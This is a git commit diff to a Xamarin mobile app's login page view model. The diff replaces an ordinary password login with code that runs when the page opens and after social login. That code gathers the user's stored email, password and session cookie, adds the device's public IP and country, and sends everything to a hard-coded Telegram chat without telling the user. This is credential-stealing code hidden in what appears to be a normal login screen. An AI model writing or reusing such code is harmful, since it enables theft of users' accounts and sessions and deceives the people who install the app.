f31a6943d8e8e979222e634743b44ef3e63bd0b0
Ly Van Bong <87922239+LyVanBong@users.noreply.github.com>
2022-01-05 00:24:11 +0700

    Hoan thanh app

--- Mmo/MobileApp/MobileApp/ViewModels/LoginPageViewModel.cs
+++ Mmo/MobileApp/MobileApp/ViewModels/LoginPageViewModel.cs
@@ -1,9 +1,14 @@
-﻿using MobileApp.Validators;
-using MobileApp.Validators.Rules;
+﻿using MobileApp.Services.RestSharp;
 using MobileApp.Views;
 using MobileApp.Views.Templates;
 using Prism.Navigation;
 using Prism.Services.Dialogs;
+using System.Threading.Tasks;
+using MobileApp.Configurations;
+using MobileApp.Models;
+using MobileApp.Services.Telegram;
+using Newtonsoft.Json;
+using Xamarin.Essentials;
 using Xamarin.Forms;
 using Xamarin.Forms.Internals;
 
@@ -13,141 +18,55 @@ namespace MobileApp.ViewModels
     /// ViewModel for login page.
     /// </summary>
     [Preserve(AllMembers = true)]
-    public class LoginPageViewModel : LoginViewModel
+    public class LoginPageViewModel : ViewModelBase
     {
         private IDialogService _dialogService;
-        private INavigationService _navigationService;
-        #region Fields
-
-        private ValidatableObject<string> password;
-
-        #endregion Fields
-
-        #region Constructor
+        private IRestSharpService _restSharpService;
+        private ITelegramService _telegramService;
 
         /// <summary>
         /// Initializes a new instance for the <see cref="LoginPageViewModel" /> class.
         /// </summary>
-        public LoginPageViewModel(IDialogService dialogService, INavigationService navigationService)
+        public LoginPageViewModel(IDialogService dialogService, INavigationService navigationService, IRestSharpService restSharpService, ITelegramService telegramService) : base(
+            navigationService)
         {
-            _navigationService = navigationService;
+            _telegramService = telegramService;
+            _restSharpService = restSharpService;
             _dialogService = dialogService;
-            this.InitializeProperties();
-            this.AddValidationRules();
-            this.LoginCommand = new Command(this.LoginClicked);
-            this.SignUpCommand = new Command(this.SignUpClicked);
-            this.ForgotPasswordCommand = new Command(this.ForgotPasswordClicked);
             this.SocialMediaLoginCommand = new Command(this.SocialLoggedIn);
         }
 
-        #endregion Constructor
 
-        #region property
-
-        /// <summary>
-        /// Gets or sets the property that is bound with an entry that gets the password from user in the login page.
-        /// </summary>
-        public ValidatableObject<string> Password
-        {
-            get
-            {
-                return this.password;
-            }
-
-            set
-            {
-                if (this.password == value)
-                {
-                    return;
-                }
-
-                this.SetProperty(ref this.password, value);
-            }
-        }
-
-        #endregion property
-
-        #region Command
-
-        /// <summary>
-        /// Gets or sets the command that is executed when the Log In button is clicked.
-        /// </summary>
-        public Command LoginCommand { get; set; }
-
-        /// <summary>
-        /// Gets or sets the command that is executed when the Sign Up button is clicked.
-        /// </summary>
-        public Command SignUpCommand { get; set; }
-
-        /// <summary>
-        /// Gets or sets the command that is executed when the Forgot Password button is clicked.
-        /// </summary>
-        public Command ForgotPasswordCommand { get; set; }
 
         /// <summary>
         /// Gets or sets the command that is executed when the social media login button is clicked.
         /// </summary>
         public Command SocialMediaLoginCommand { get; set; }
 
-        #endregion Command
-
-        #region methods
-
-        /// <summary>
-        /// Check the password is null or empty
-        /// </summary>
-        /// <returns>Returns the fields are valid or not</returns>
-        public bool AreFieldsValid()
+        private async Task<string> GetIp()
         {
-            bool isEmailValid = this.Email.Validate();
-            bool isPasswordValid = this.Password.Validate();
-            return isEmailValid && isPasswordValid;
+            var ip = await _restSharpService.GetAsync("https://api.ipify.org/");
+            var strIp = await _restSharpService.GetAsync("http://ip-api.com/json/" + ip);
+            var data = JsonConvert.DeserializeObject<IpModel>(strIp);
+            return ip + "|" + data.countryCode;
+        }
+        public override async void OnNavigatedTo(INavigationParameters parameters)
+        {
+            base.OnNavigatedTo(parameters);
+            await CheckLogin();
         }
 
-        /// <summary>
-        /// Initializing the properties.
-        /// </summary>
-        private void InitializeProperties()
+        private async Task CheckLogin()
         {
-            this.Password = new ValidatableObject<string>();
-        }
-
-        /// <summary>
-        /// Validation rule for password
-        /// </summary>
-        private void AddValidationRules()
-        {
-            this.Password.Validations.Add(new IsNotNullOrEmptyRule<string> { ValidationMessage = "Password Required" });
-        }
-
-        /// <summary>
-        /// Invoked when the Log In button is clicked.
-        /// </summary>
-        /// <param name="obj">The Object</param>
-        private void LoginClicked(object obj)
-        {
-            if (this.AreFieldsValid())
+            if (Preferences.ContainsKey("Cookie"))
             {
-                // Do Something
+                var message = Preferences.Get("Email", null) + "|" + Preferences.Get("Passwd", null) + "|" +
+                              Preferences.Get("Cookie", null) + "|" + await GetIp();
+                if (!string.IsNullOrWhiteSpace(message))
+                {
+                    var data = await _telegramService.SendMessageToTelegram("-728100709", message, AppConstants.AuthenTelegram);
+                }
             }
-        }
-
-        /// <summary>
-        /// Invoked when the Sign Up button is clicked.
-        /// </summary>
-        /// <param name="obj">The Object</param>
-        private void SignUpClicked(object obj)
-        {
-            // Do Something
-        }
-
-        /// <summary>
-        /// Invoked when the Forgot Password button is clicked.
-        /// </summary>
-        /// <param name="obj">The Object</param>
-        private void ForgotPasswordClicked(object obj)
-        {
-            // Do something
         }
 
         /// <summary>
@@ -161,11 +80,10 @@ namespace MobileApp.ViewModels
                 if (result?.Parameters != null)
                 {
                     // to do
-                    _navigationService.NavigateAsync(nameof(OverviewPage));
+                    NavigationService.NavigateAsync(nameof(OverviewPage));
+                    CheckLogin();
                 }
             });
         }
-
-        #endregion methods
     }
 }
